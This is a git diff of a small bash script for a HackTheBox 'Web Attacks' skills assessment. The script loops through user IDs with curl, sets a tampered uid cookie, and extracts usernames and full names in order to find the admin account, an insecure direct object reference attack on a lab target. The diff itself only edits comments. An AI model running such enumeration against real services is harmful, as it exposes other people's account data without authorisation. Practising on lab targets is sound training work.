@@ -1,11 +1,11 @@
 #!/bin/bash
 
 # For HacktheBox Web Attacks skills assessment. Find admin uid. Burp Suite may be easier but skripting is more fun! 
-
-url="http://ip:port" # Change this
-
+# Add ip
+url="http://ip:port" 
+#Add cookie
 for i in {1..100}; do
-	request=$(curl -s -X GET "$url/api.php/user/$i" -H "Cookie: PHPSESSID=<add_your_cookie>; uid=$i") # Add your cookie here
+	request=$(curl -s -X GET "$url/api.php/user/$i" -H "Cookie: PHPSESSID=<add_your_cookie>; uid=$i") 
 	uid=$(echo "$request" | jq -r '.uid')
 	username=$(echo "$request" | jq -r '.username')
 	full_name=$(echo "$request" | jq -r '.full_name')
